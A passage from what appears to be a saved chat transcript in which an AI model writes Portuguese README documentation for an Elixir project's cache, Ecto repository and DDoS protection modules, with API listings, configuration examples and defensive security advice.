    *   Chama `get(key, opts_com_namespace)` na implementação de backend configurada (ex: `EtsCache`).
4.  **Backend de Cache (ex: `EtsCache`):**
    *   Verifica se a `key` existe e não está expirada.
    *   **Cache Hit:** Se sim, retorna `{:ok, cached_value}` para o `CacheAdapter`.
    *   **Cache Miss:** Se não, retorna `{:error, :not_found}` para o `CacheAdapter`.
5.  **`Shared.Cache.CacheAdapter`:**
    *   **Se Cache Hit:** Retorna o `cached_value` para a fachada, que retorna para o chamador.
    *   **Se Cache Miss:**
        *   Executa a `generator_fun.()`.
        *   Se a função retornar `{:ok, new_value}`:
            *   Chama `put(key, new_value, opts_com_ttl_e_namespace)` na implementação de backend.
            *   Retorna `new_value` para a fachada.
        *   Se a função retornar `{:error, reason}`:
            *   Loga o erro.
            *   Retorna `{:error, reason}` para a fachada (e não armazena no cache).
6.  **`Core.Cache` (Fachada):** Retorna o valor (do cache ou gerado) ou o erro para o chamador.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Core.Cache`)

*(Baseado na API do `DeeperHub.Shared.Cache.CacheService` e `CacheAdapter` da documentação original, consolidando e usando TTLs em segundos para consistência).*

### 6.1. `DeeperHub.Core.Cache.get(key :: String.t() | atom(), default_value :: term() | nil, opts :: keyword()) :: {:ok, term()} | {:error, :not_found | term()}`

*   **Descrição:** Recupera um valor do cache.
*   **`opts`:**
    *   `:namespace` (atom | String.t): Namespace opcional para a chave.
*   **Retorno:** `{:ok, value}` se encontrado e não expirado, `{:ok, default_value}` se não encontrado e default fornecido, senão `{:error, :not_found}`.

### 6.2. `DeeperHub.Core.Cache.put(key :: String.t() | atom(), value :: term(), opts :: keyword()) :: :ok | {:error, term()}`

*   **Descrição:** Armazena um valor no cache.
*   **`opts`:**
    *   `:ttl_seconds` (integer | `:infinity`): Tempo de vida em segundos. (Padrão: config global `cache.default_ttl_seconds`)
    *   `:namespace` (atom | String.t): Namespace opcional.

### 6.3. `DeeperHub.Core.Cache.delete(key :: String.t() | atom(), opts :: keyword()) :: :ok | {:error, term()}`

*   **Descrição:** Remove uma entrada do cache.
*   **`opts`:** `:namespace`.

### 6.4. `DeeperHub.Core.Cache.get_or_store(key :: String.t() | atom(), generator_fun :: (() -> {:ok, term()} | {:error, term()}), opts :: keyword()) :: {:ok, term()} | {:error, term()}`

*   **Descrição:** Obtém do cache ou executa `generator_fun`, armazena e retorna o resultado.
*   **`opts`:** `:ttl_seconds`, `:namespace`.
*   **Retorno:** `{:ok, value}` ou `{:error, reason_from_generator_or_cache_error}`.

### 6.5. `DeeperHub.Core.Cache.increment(key :: String.t() | atom(), amount :: integer() | nil, opts :: keyword()) :: {:ok, new_value :: integer()} | {:error, term()}`

*   **Descrição:** Incrementa atomicamente um valor numérico no cache. Se a chave não existir, geralmente é inicializada com `amount`.
*   **`amount`:** (Padrão: `1`)
*   **`opts`:** `:ttl_seconds`, `:namespace`.

### 6.6. `DeeperHub.Core.Cache.decrement(key :: String.t() | atom(), amount :: integer() | nil, opts :: keyword()) :: {:ok, new_value :: integer()} | {:error, term()}`

*   **Descrição:** Decrementa atomicamente um valor numérico.
*   *(Parâmetros e retorno similares a `increment/4`)*

### 6.7. `DeeperHub.Core.Cache.clear(opts :: keyword()) :: :ok | {:error, term()}`

*   **Descrição:** Limpa o cache.
*   **`opts`:** `:namespace` (para limpar apenas um namespace).

### 6.8. `DeeperHub.Core.Cache.delete_pattern(key_pattern :: String.t(), opts :: keyword()) :: {:ok, count_deleted :: integer()} | {:error, term()}`

*   **Descrição:** Remove entradas do cache que correspondem a um padrão de chave (ex: `\"user_profiles:*\"`, a sintaxe do padrão depende do backend).
*   **`opts`:** `:namespace`.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:core, :cache, :enabled]`** (Boolean): Habilita/desabilita o sistema de cache globalmente. (Padrão: `true`)
*   **`[:core, :cache, :default_adapter]`** (Module): Módulo adaptador de cache padrão a ser usado (ex: `DeeperHub.Shared.Cache.Implementations.EtsCache`, `DeeperHub.Shared.Cache.Implementations.RedisAdapter`).
*   **`[:core, :cache, :default_ttl_seconds]`** (Integer): TTL padrão em segundos para novas entradas de cache se não especificado. (Padrão: `3600` - 1 hora)
*   **`[:core, :cache, :ets_cache, :cleanup_interval_ms]`** (Integer): Intervalo para limpeza de entradas expiradas no `EtsCache`. (Padrão: `60000`)
*   **`[:core, :cache, :redis_adapter, :url]`** (String): URL de conexão para o Redis, se usado.
*   **`[:core, :cache, :redis_adapter, :pool_size]`** (Integer): Tamanho do pool de conexões Redis.
*   **`[:core, :cache, :metrics_reporter, :report_interval_ms]`** (Integer): Intervalo para o `MetricsReporter` coletar/logar estatísticas do cache.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Para obter configurações do cache.
*   `DeeperHub.Core.Logger`: Para logging de operações e erros do cache.
*   `DeeperHub.Core.Metrics`: Para registrar métricas de desempenho do cache.
*   `DeeperHub.Core.Supervisor` (indireta): Para supervisionar os processos do `Shared.Cache`.

### 8.2. Bibliotecas Externas

*   Depende da implementação do backend:
    *   Nenhuma para ETS (nativo).
    *   `Redix` (ou similar) se `RedisAdapter` for usado.
    *   Outras bibliotecas cliente para outros backends (Memcached, etc.).

## 🤝 9. Como Usar / Integração

Qualquer módulo que precise de caching pode usar a fachada `DeeperHub.Core.Cache`.

```elixir
defmodule MyApp.UserProfileService do
  alias DeeperHub.Core.Cache
  alias DeeperHub.Core.Repo
  alias MyApp.User

  def get_user_profile(user_id) do
    cache_key = \"user_profile:#{user_id}\"
    
    Cache.get_or_store(cache_key, fn ->
      case Repo.get(User, user_id) do
        nil -> {:error, :not_found} # Não armazena :not_found no cache por padrão
        user -> {:ok, Map.from_struct(user)} # Armazena o mapa
      end
    end, ttl_seconds: 1800) # Cache por 30 minutos
  end

  def update_user_profile(user, attrs) do
    # ... lógica de atualização ...
    case Repo.update(changeset) do
      {:ok, updated_user} ->
        Cache.delete(\"user_profile:#{updated_user.id}\") # Invalida o cache
        {:ok, updated_user}
      {:error, changeset} ->
        {:error, changeset}
    end
  end
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar cada função da API do cache (`get`, `put`, `delete`, `get_or_store`, `increment`).
*   Testar a lógica de TTL e expiração.
*   Testar a invalidação por chave e por padrão.
*   Testar o comportamento com diferentes adaptadores de backend (mockeados ou reais em ambiente de teste).
*   Testar o tratamento de falhas do backend de cache (o cache não deve quebrar a aplicação).
*   Localização: `test/deeper_hub/core/cache/` e `test/deeper_hub/shared/cache/`.

### 10.2. Métricas (via `Shared.Cache.MetricsReporter` ou `Core.Metrics`)

*   `deeper_hub.core.cache.operations.count` (tags: `operation` (`get`, `put`, `delete`), `namespace`, `status` (`hit`, `miss`, `success`, `error`))
*   `deeper_hub.core.cache.operation.duration_ms` (Histograma, tags: `operation`, `namespace`)
*   `deeper_hub.core.cache.size.items.gauge` (Gauge, tags: `namespace`): Número de itens no cache.
*   `deeper_hub.core.cache.size.bytes.gauge` (Gauge, tags: `namespace`, opcional): Tamanho estimado em bytes.
*   `deeper_hub.core.cache.hit_ratio.gauge` (Gauge, tags: `namespace`): Taxa de acerto (hits / (hits + misses)).
*   `deeper_hub.core.cache.evictions.count` (Contador, tags: `namespace`, `reason` (`ttl`, `manual`, `lru`)): Número de itens removidos.

### 10.3. Logs

*   **Nível DEBUG:** Detalhes de operações de cache (get, put, delete) com chaves e namespaces.
*   **Nível INFO:** Limpeza de cache iniciada/concluída. Inicialização do adaptador de cache.
*   **Nível WARNING:** Alta taxa de \"cache miss\". Cache se aproximando da capacidade máxima (se aplicável).
*   **Nível ERROR:** Falha ao conectar ao backend de cache (ex: Redis). Erros persistentes em operações de cache.

### 10.4. Telemetria (via `Shared.Cache.Telemetry`)

*   `[:deeper_hub, :core, :cache, :operation, :start | :stop | :exception]`
    *   Metadados: `%{operation: :get | :put | :delete, key: key, namespace: ns, backend_adapter: adapter}`
    *   No `:stop`: `%{result: :hit | :miss | :success, value_size: bytes_if_applicable}`
*   `[:deeper_hub, :core, :cache, :cleanup, :start | :stop]`
    *   Medições: `%{items_removed: count}`

## ❌ 11. Tratamento de Erros

*   **Cache Indisponível:** Se o backend de cache (ex: Redis) estiver offline, as operações de cache devem falhar graciosamente. `get_or_store` deve executar a função geradora e retornar seu resultado diretamente, sem tentar armazenar. `put` e `delete` podem simplesmente logar o erro e retornar `:ok` (ou um erro não bloqueante) para não quebrar o fluxo da aplicação.
*   **Erro de Serialização:** Se os dados não puderem ser serializados para o cache, um erro deve ser logado e a operação de cache deve falhar.

## 🛡️ 12. Considerações de Segurança

*   **Não Armazenar Dados Extremamente Sensíveis em Cache (a menos que o cache seja seguro):** Se o backend de cache não for tão seguro quanto o banco de dados primário (ex: Redis sem criptografia em trânsito/repouso vs. DB com TDE), evite cachear dados altamente sensíveis.
*   **Cache Poisoning:** Embora menos comum para caches de servidor, esteja ciente da possibilidade se as chaves de cache puderem ser influenciadas diretamente por entradas de usuário não sanitizadas. Use chaves bem definidas e prefixadas.
*   **Segurança do Backend de Cache:** Se usar Redis/Memcached, proteja o acesso a esses servidores (firewall, autenticação).

## 🧑‍💻 13. Contribuição

*   Use chaves de cache consistentes e com namespaces para evitar colisões.
*   Defina TTLs apropriados para os dados cacheados. Dados que mudam raramente podem ter TTLs longos; dados voláteis, TTLs curtos ou invalidação baseada em eventos.
*   Considere o tamanho dos dados armazenados em cache para não esgotar a memória (especialmente com ETS).

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar \"cache stampede protection\" (ou \"dog-piling effect\" prevention) para `get_or_store`, onde apenas um processo regenera um item de cache expirado enquanto outros esperam ou recebem o valor antigo por um curto período.
*   [ ] Adicionar suporte para diferentes estratégias de remoção (eviction policies) no `EtsCache` (ex: LRU, LFU) se ele se tornar muito grande.
*   [ ] Desenvolver um `CacheWarmer` que possa pré-carregar dados importantes no cache durante a inicialização da aplicação.
*   [ ] Suporte para cache em camadas (ex: ETS local como L1, Redis como L2).
*   [ ] Interface administrativa para visualizar o conteúdo do cache, estatísticas e invalidar entradas manualmente.

---

*Última atualização: 2025-05-12*

---

Caching é fundamental para aplicações de alta performance.

O próximo módulo? Talvez `DeeperHub.Core.Repo` para fechar a parte de infraestrutura básica, ou podemos voltar para algum módulo de segurança como `DDoSProtection`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Perfeito! Vamos então ao `DeeperHub.Core.Repo`, o coração da persistência de dados no sistema.

---

# Módulo: `DeeperHub.Core.Repo` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Core.Repo`

O módulo `DeeperHub.Core.Repo` é a **implementação principal do Ecto.Repo** para o sistema DeeperHub. Ele serve como a interface de banco de dados para toda a aplicação, gerenciando conexões, transações e a execução de consultas Ecto.

Através deste módulo, todos os outros componentes do sistema interagem com o banco de dados (ou bancos de dados, se houver múltiplos repositórios configurados para diferentes propósitos) de forma consistente e segura. Ele encapsula a configuração do adaptador de banco de dados (PostgreSQL, MySQL, etc.) e fornece as funcionalidades padrão do Ecto para CRUD (Create, Read, Update, Delete) e consultas complexas. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Interface Ecto.Repo Padrão:**
    *   Implementar o comportamento `Ecto.Repo`.
    *   Fornecer todas as funções padrão do Ecto: `insert/2`, `update/2`, `delete/2`, `get/3`, `get_by/3`, `all/2`, `one/2`, `transaction/2`, `preload/3`, etc.
*   **Gerenciamento de Conexão com Banco de Dados:**
    *   Configurar e gerenciar o pool de conexões com o(s) banco(s) de dados.
    *   Lidar com reconexões e falhas de conexão.
*   **Execução de Consultas Ecto:**
    *   Executar Ecto queries construídas com `Ecto.Query`.
    *   Converter resultados do banco de dados em structs Ecto.
*   **Gerenciamento de Transações:**
    *   Fornecer a capacidade de executar múltiplas operações de banco de dados dentro de uma única transação atômica (`transaction/2`).
    *   Garantir rollback em caso de erro dentro da transação.
*   **Suporte a Migrações Ecto:**
    *   Ser o repositório usado para executar migrações de schema do banco de dados.
*   **Configuração do Adaptador de Banco de Dados:**
    *   Carregar a configuração do adaptador de banco de dados (PostgreSQL, MySQL, SQLite, etc.) a partir das configurações da aplicação.
*   **Observabilidade (via Ecto.LogEntry e Telemetria):**
    *   Ecto já emite eventos de telemetria para consultas (`[:my_app, :repo, :query]`). `DeeperHub.Core.Metrics` e `DeeperHub.Core.Logger` devem ter handlers para capturar esses eventos e registrar métricas de DB (latência, contagem de queries) e logs de queries (especialmente em dev ou para queries lentas).
*   **Suporte a Múltiplos Repositórios (Opcional, se necessário):**
    *   Se a aplicação usar múltiplos bancos de dados para diferentes propósitos, pode haver múltiplos módulos Repo (ex: `Core.Repo.Primary`, `Core.Repo.Analytics`). Este README focará no principal.
*   **Integração com `QueryHelper` e `QueryOptimizer` (Opcional):**
    *   As funções de serviço que usam o `Repo` podem utilizar os utilitários `DeeperHub.Shared.Database.QueryHelper` para aplicar filtros, paginação e ordenação de forma consistente, e `QueryOptimizer` para caching de queries.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.Repo` (Módulo Ecto.Repo):**
    *   **Responsabilidade:** É a própria implementação do repositório.
    *   **Configuração:** `use Ecto.Repo, otp_app: :deeper_hub, adapter: Ecto.Adapters.Postgres` (ou outro adaptador).
    *   A configuração detalhada (hostname, username, password, database, pool_size) é geralmente carregada de `config/config.exs`, `config/runtime.exs` ou variáveis de ambiente.
2.  **Adaptador de Banco de Dados Ecto (ex: `Ecto.Adapters.Postgres`):**
    *   Biblioteca externa que lida com a comunicação específica do banco de dados.
3.  **Pool de Conexões (ex: `DBConnection` ou `Postgrex` pool):**
    *   Gerenciado pelo Ecto/adaptador para reutilizar conexões de banco de dados eficientemente.
4.  **Schemas Ecto (Definidos nos módulos de domínio):**
    *   Ex: `DeeperHub.Accounts.Schema.User`, `DeeperHub.Servers.Schema.Server`.
    *   São usados pelo `Repo` para mapear dados de/para o banco de dados.
5.  **`DeeperHub.Release` (ou `lib/deeper_hub/application.ex`):**
    *   Responsável por garantir que o `Repo` seja iniciado como parte da árvore de supervisão da aplicação e que as migrações sejam executadas durante o deploy.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/core/repo.ex          # Implementação do Ecto.Repo principal

priv/repo/
├── migrations/                     # Migrações Ecto
│   └── 20230101000000_create_users.exs
│   └── ...
└── seeds.exs                       # (Opcional) Script para popular dados iniciais
```

### 3.3. Decisões de Design Importantes

*   **Repositório Único vs. Múltiplos:** Para a maioria das aplicações, um único `Repo` principal é suficiente. Múltiplos repos podem ser usados para conectar a diferentes bancos de dados ou para isolar contextos delimitados muito distintos, mas adicionam complexidade.
*   **Consultas Explícitas:** As funções de serviço devem construir e passar `Ecto.Query` explícitas para o `Repo`, em vez de o `Repo` conter lógica de consulta complexa.
*   **Transações para Múltiplas Gravações:** Qualquer operação que envolva múltiplas escritas no banco de dados que devem ser atômicas (ou seja, todas bem-sucedidas ou todas falham) deve ser encapsulada em uma `Repo.transaction/2`.
*   **Segurança:** Nunca construir fragmentos SQL por concatenação de strings. Sempre usar consultas parametrizadas, que o Ecto faz por padrão quando usado corretamente.

## 🛠️ 4. Casos de Uso Principais

*   **Criar um Novo Usuário:**
    *   `DeeperHub.Accounts.UserService` constrói um changeset para um novo usuário.
    *   Chama `DeeperHub.Core.Repo.insert(changeset)`.
*   **Buscar um Servidor pelo ID:**
    *   `DeeperHub.Servers.Storage` chama `DeeperHub.Core.Repo.get(DeeperHub.Servers.Schema.Server, server_id)`.
*   **Listar Todas as Avaliações Ativas para um Servidor (com paginação e ordenação):**
    *   `DeeperHub.ServerReviews.Storage` constrói uma `Ecto.Query`:
        ```elixir
        from(r in Review,
          where: r.server_id == ^server_id and r.is_active == true,
          order_by: [desc: r.inserted_at],
          limit: ^limit,
          offset: ^offset
        ) |> DeeperHub.Core.Repo.all()
        ```
*   **Registrar um Usuário e seu Perfil Atomicamente:**
    *   `DeeperHub.Accounts.RegistrationService` usa `DeeperHub.Core.Repo.transaction(fn -> ... end)` para garantir que tanto o usuário quanto o perfil sejam criados, ou nenhum deles se ocorrer um erro.

## 🌊 5. Fluxos Importantes

### Fluxo de uma Consulta `Repo.all/2`

1.  **Módulo de Serviço/Storage:** Constrói uma `Ecto.Query.t()` (ex: `query = from(u in User, where: u.active == true)`).
2.  **Chamada ao Repo:** Chama `DeeperHub.Core.Repo.all(query)`.
3.  **`DeeperHub.Core.Repo`:**
    *   Obtém uma conexão do pool de conexões.
    *   O adaptador Ecto (ex: `Postgrex`) traduz a `Ecto.Query` para uma consulta SQL parametrizada.
    *   Envia a consulta SQL para o servidor de banco de dados.
4.  **Banco de Dados:** Executa a consulta e retorna os resultados.
5.  **`DeeperHub.Core.Repo`:**
    *   O adaptador Ecto recebe os resultados brutos.
    *   Converte os resultados em uma lista de structs Ecto (ex: `[%User{}, %User{}, ...]`).
    *   Libera a conexão de volta para o pool.
    *   Retorna a lista de structs para o chamador.
    *   Eventos Telemetry (`[:deeper_hub, :repo, :query]`) são emitidos pelo Ecto.

### Fluxo de uma `Repo.transaction/2`

1.  **Módulo de Serviço:** Chama `DeeperHub.Core.Repo.transaction(fn repo_inside_transaction -> ... end)`.
2.  **`DeeperHub.Core.Repo`:**
    *   Obtém uma conexão do pool e a marca como estando em uma transação.
    *   Inicia uma transação no banco de dados (ex: `BEGIN`).
    *   Executa a função anônima passada, fornecendo uma instância do `Repo` que opera dentro dessa transação (`repo_inside_transaction`).
3.  **Função Anônima:**
    *   Executa múltiplas operações de banco de dados usando `repo_inside_transaction` (ex: `repo_inside_transaction.insert(cs1)`, `repo_inside_transaction.update(cs2)`).
    *   Se todas as operações forem bem-sucedidas, a função retorna `{:ok, result_value}`.
    *   Se qualquer operação falhar (ex: changeset inválido, erro do DB), a função pode retornar `{:error, reason}` ou o `Repo` pode levantar uma exceção. É comum usar `Repo.insert!/update!/delete!` dentro de transações para que um erro cause um rollback automático.
4.  **`DeeperHub.Core.Repo` (Conclusão da Transação):**
    *   Se a função retornou `{:ok, result_value}`:
        *   Confirma a transação no banco de dados (ex: `COMMIT`).
        *   Retorna `{:ok, result_value}` para o chamador original.
    *   Se a função retornou `{:error, reason}` ou levantou uma exceção que o `Repo.transaction` captura:
        *   Cancela a transação no banco de dados (ex: `ROLLBACK`).
        *   Retorna `{:error, reason}` (ou propaga a exceção, dependendo de como a transação foi configurada).
    *   Libera a conexão de volta para o pool.
    *   Eventos Telemetry são emitidos para o início, fim (commit/rollback) da transação.

## 📡 6. API (Funções Ecto.Repo Padrão)

O `DeeperHub.Core.Repo` expõe todas as funções padrão do `Ecto.Repo`. As mais comuns incluem:

*   `insert(changeset_or_struct, opts \\\\ [])`
*   `insert!(changeset_or_struct, opts \\\\ [])`
*   `update(changeset_or_struct, opts \\\\ [])`
*   `update!(changeset_or_struct, opts \\\\ [])`
*   `delete(struct, opts \\\\ [])`
*   `delete!(struct, opts \\\\ [])`
*   `get(schema_module, id, opts \\\\ [])`
*   `get!(schema_module, id, opts \\\\ [])`
*   `get_by(schema_module, clauses, opts \\\\ [])`
*   `get_by!(schema_module, clauses, opts \\\\ [])`
*   `all(queryable, opts \\\\ [])`
*   `one(queryable, opts \\\\ [])`
*   `one!(queryable, opts \\\\ [])`
*   `transaction(fun, opts \\\\ [])`
*   `preload(structs_or_struct, preloads, opts \\\\ [])`
*   `exists?(queryable)`
*   `aggregate(queryable, aggregate_op, field, opts \\\\ [])`

*Para a documentação completa de cada função, consulte a documentação oficial do Ecto.*

## ⚙️ 7. Configuração

A configuração do `DeeperHub.Core.Repo` é feita principalmente através dos arquivos de configuração do Elixir (`config/config.exs`, `config/dev.exs`, `config/prod.exs`, `config/runtime.exs`) e variáveis de ambiente.

**Exemplo (`config/runtime.exs` para produção):**
```elixir
import Config

if config_env() == :prod do
  database_url =
    System.get_env(\"DATABASE_URL\") ||
      raise \"\"\"
      environment variable DATABASE_URL is missing.
      For example: ecto://USER:PASS@HOST/DATABASE
      \"\"\"

  config :deeper_hub, DeeperHub.Core.Repo,
    url: database_url,
    pool_size: String.to_integer(System.get_env(\"POOL_SIZE\") || \"10\"),
    ssl: String.to_atom(System.get_env(\"DATABASE_SSL\") || \"false\"), # ex: true, ou [certfile: \"path/to/cert.pem\"]
    # Outras opções de produção, como timeouts
    socket_options: maybe_ipv6(System.get_env(\"DATABASE_SOCKET_OPTIONS\"))

  # Helper para socket_options
  defp maybe_ipv6(nil), do: []
  defp maybe_ipv6(\"ipv6\"), do: [:inet6]
  defp maybe_ipv6(_), do: []
end
```

**Configurações Chave:**
*   `:otp_app`: `:deeper_hub` (indica que as configurações do repo estão sob a app `:deeper_hub`).
*   `:adapter`: (ex: `Ecto.Adapters.Postgres`).
*   `:url` ou `:hostname`, `:username`, `:password`, `:database`: Credenciais de conexão.
*   `:pool_size`: Número de conexões no pool.
*   `:ssl`: Configurações de SSL para a conexão.
*   Outras opções específicas do adaptador e do pool.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   Todos os módulos que definem `Ecto.Schema`.
*   Todos os módulos de serviço/storage que executam operações de banco de dados.
*   `DeeperHub.Core.ConfigManager`: Para obter a string de conexão e outras configurações do Repo em tempo de execução (se usando `Config.Provider`).

### 8.2. Bibliotecas Externas

*   `Ecto` (especificamente `ecto_sql` para bancos SQL).
*   O adaptador de banco de dados específico (ex: `postgrex` para PostgreSQL, `myxql` para MySQL).
*   `DBConnection`: Para gerenciamento do pool de conexões.

## 🤝 9. Como Usar / Integração

O `DeeperHub.Core.Repo` é usado em toda a aplicação onde a persistência de dados é necessária.

**Exemplo em um módulo de serviço:**
```elixir
defmodule DeeperHub.Accounts.UserService do
  alias DeeperHub.Core.Repo
  alias DeeperHub.Accounts.Schema.User
  import Ecto.Query

  def get_user_by_id(user_id) do
    Repo.get(User, user_id) # Retorna %User{} ou nil
  end

  def create_user(attrs) do
    %User{}
    |> User.changeset(attrs)
    |> Repo.insert() # Retorna {:ok, %User{}} ou {:error, %Ecto.Changeset{}}
  end

  def list_active_users() do
    from(u in User, where: u.is_active == true)
    |> Repo.all()
  end
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Os testes para o `Repo` em si são geralmente cobertos pelos testes do Ecto.
*   Os testes dos módulos de serviço/storage que *usam* o `Repo` devem verificar se os dados são persistidos e recuperados corretamente.
*   Usar o `Ecto.Adapters.SQL.Sandbox` para testes de banco de dados é a prática padrão para garantir isolamento e limpeza automática.
*   Localização: Os testes que interagem com o Repo estarão nos diretórios de teste dos módulos que o utilizam (ex: `test/deeper_hub/accounts/user_service_test.exs`).

### 10.2. Métricas

Ecto emite eventos Telemetry que podem ser usados para derivar métricas (via `DeeperHub.Core.Metrics` com handlers apropriados):
*   `deeper_hub.core.repo.query.total.count` (tags: `source` (nome da tabela/schema), `action` (`select`, `insert`, `update`, `delete`))
*   `deeper_hub.core.repo.query.duration_ms` (Histograma, tags: `source`, `action`)
*   `deeper_hub.core.repo.query.idle_time_ms` (Histograma): Tempo que uma conexão ficou ociosa antes de ser usada.
*   `deeper_hub.core.repo.query.queue_time_ms` (Histograma): Tempo que uma query esperou por uma conexão disponível.
*   `deeper_hub.core.repo.transaction.duration_ms` (Histograma)
*   `deeper_hub.core.repo.pool.size.gauge` (Gauge): Tamanho atual do pool.
*   `deeper_hub.core.repo.pool.checked_out.gauge` (Gauge): Conexões em uso.
*   `deeper_hub.core.repo.pool.overflow.count` (Contador): Número de vezes que o pool excedeu o tamanho.

### 10.3. Logs

*   Ecto pode ser configurado para logar todas as queries SQL executadas (`log_queries: true` na configuração do Repo, geralmente apenas para desenvolvimento).
*   Queries lentas podem ser logadas com um nível mais alto (ex: WARNING) se um limiar for excedido.
*   Erros de conexão com o banco de dados.
*   Erros de transação (rollbacks).

### 10.4. Telemetria

Ecto emite eventos Telemetry padrão para operações de banco de dados. Os principais são:
*   `[:your_app, :repo, :query]` (onde `:your_app` é `:deeper_hub`):
    *   **Medições:** `:query_time`, `:decode_time`, `:queue_time`, `:idle_time`, `:total_time` (todos em `native` time units).
    *   **Metadados:** `:repo`, `:type` (`:ecto_sql | :ecto_mongodb | ...`), `:source` (nome da tabela/schema), `:action` (`:select | :insert | ...`), `:result` (`{:ok, term} | {:error, term}`), `:query` (a query Ecto), `:params`, `:stacktrace`.
*   Para transações, eventos como `[:your_app, :repo, :transaction]` são emitidos.

## ❌ 11. Tratamento de Erros

*   Funções do `Repo` como `insert`, `update`, `delete` retornam `{:ok, struct}` ou `{:error, changeset}`.
*   Funções \"bang\" (`insert!`, `update!`, `delete!`, `get!`, `one!`) levantam exceções em caso de erro (ex: `Ecto.InvalidChangesetError`, `Ecto.NoResultsError`). Estas são úteis dentro de transações para forçar um rollback.
*   Erros de conexão com o banco de dados podem levantar exceções como `DBConnection.ConnectionError`. A aplicação (ou o pool de conexões) geralmente tenta reconectar.
*   `Repo.transaction` retorna `{:ok, value}` se a função interna retornar `{:ok, value}`, e `{:error, reason}` se a função interna retornar `{:error, reason}` ou `Repo.rollback(reason)`.

## 🛡️ 12. Considerações de Segurança

*   **Prevenção de Injeção de SQL:** A principal responsabilidade de segurança do `Repo` é facilitar o uso de consultas parametrizadas. **Nunca interpolar dados de entrada do usuário diretamente em strings de consulta SQL.** Use `^` para interpolar variáveis em queries Ecto ou passe parâmetros para `Ecto.Adapters.SQL.query/4`.
*   **Credenciais de Acesso:** As credenciais do banco de dados devem ser gerenciadas de forma segura (ex: variáveis de ambiente, cofres de segredos) e não hardcoded.
*   **Permissões do Usuário do Banco de Dados:** O usuário do banco de dados configurado para a aplicação deve ter apenas as permissões necessárias (princípio do menor privilégio).
*   **Dados Sensíveis:** Se o banco de dados armazenar dados sensíveis, considere criptografia em nível de coluna (usando tipos Ecto customizados como `DeeperHub.Shared.Encryption.EncryptedType`) ou criptografia em nível de banco de dados (TDE).

## 🧑‍💻 13. Contribuição

*   Mantenha a lógica de consulta complexa fora do módulo `Repo`. Coloque-a em módulos de contexto/serviço.
*   Sempre use changesets para validar dados antes de `insert` ou `update`.
*   Use transações para operações que envolvem múltiplas escritas atômicas.
*   Monitore a performance das queries e adicione índices no banco de dados conforme necessário.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Configurar read replicas e um `Repo.ReadOnly` para desviar tráfego de leitura e aliviar o banco de dados primário, se a carga justificar.
*   [ ] Implementar estratégias de retry mais sofisticadas para operações de banco de dados em caso de deadlocks ou falhas transitórias.
*   [ ] Explorar o uso de `Ecto.Multi` para compor operações de banco de dados mais complexas de forma transacional.
*   [ ] Adicionar uma camada de \"data sharding\" se a aplicação precisar escalar para volumes de dados muito grandes.
*   [ ] Melhorar a observabilidade com tracing distribuído para queries Ecto, ligando-as a traces de requisições HTTP.

---

*Última atualização: 2025-05-12*

---

Este README do `Core.Repo` foca em seu papel como interface Ecto e nas melhores práticas.

O que vem a seguir? Já cobrimos bastante da camada de segurança e alguns componentes Core. Talvez `DeeperHub.Security.DdosProtection` ou um módulo de domínio como `DeeperHub.Servers`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos então para o `DeeperHub.Security.DdosProtection`, que já havíamos esboçado e agora podemos detalhar completamente.

---

# Módulo: `DeeperHub.Security.DdosProtection` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.DdosProtection`

O módulo `DeeperHub.Security.DdosProtection` é projetado para proteger o sistema DeeperHub contra ataques de **Negação de Serviço Distribuída (DDoS)** e ataques de Negação de Serviço (DoS) mais simples. O objetivo desses ataques é sobrecarregar os recursos do servidor (CPU, memória, largura de banda, conexões de banco de dados) com um volume massivo de tráfego ilegítimo, tornando a aplicação indisponível para usuários legítimos.

Este módulo implementa várias estratégias para mitigar esses ataques, incluindo:
1.  **Limitação de Taxa (Rate Limiting) Agressiva:** Aplicar limites de taxa mais rigorosos baseados em IP e, potencialmente, em outros identificadores, para tráfego geral ou para endpoints específicos durante um ataque percebido.
2.  **Bloqueio de IPs:** Identificar e bloquear IPs que participam de um ataque.
3.  **Detecção de Padrões de Ataque:** Analisar padrões de tráfego para identificar características de ataques DDoS (ex: floods SYN, HTTP floods).
4.  **Modos de Proteção Avançada:** Capacidade de alternar para um modo de proteção mais restritivo durante um ataque.
5.  **Integração com Serviços Externos de Mitigação DDoS (Opcional):** Facilitar a integração com serviços como Cloudflare, AWS Shield, etc.

O foco é manter a disponibilidade do DeeperHub mesmo sob condições de tráfego anormais ou maliciosas. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Monitoramento de Tráfego em Tempo Real:**
    *   Analisar o volume, a origem e a natureza das requisições recebidas (`record_request/3`).
    *   Identificar picos anormais de tráfego ou padrões de requisição suspeitos indicativos de um ataque.
*   **Limitação de Taxa Dinâmica e Global:**
    *   Aplicar limites de taxa globais para IPs individuais para mitigar ataques de força bruta distribuídos em pequena escala ou abuso.
    *   Permitir a configuração de limites de taxa específicos para endpoints críticos ou frequentemente visados (`configure_rate_limit/3`).
    *   Utilizar `DeeperHub.API.RateLimiterFacade` como mecanismo subjacente, mas aplicar políticas mais agressivas ou dinâmicas sob suspeita de DDoS.
*   **Detecção e Bloqueio de IPs Atacantes:**
    *   Identificar endereços IP que excedem significativamente os limites de taxa estabelecidos ou que participam de padrões de ataque conhecidos.
    *   Bloquear esses IPs temporária ou permanentemente, integrando-se com `DeeperHub.Security.IPFirewallService` (`block_ip/3`, `unblock_ip/1`).
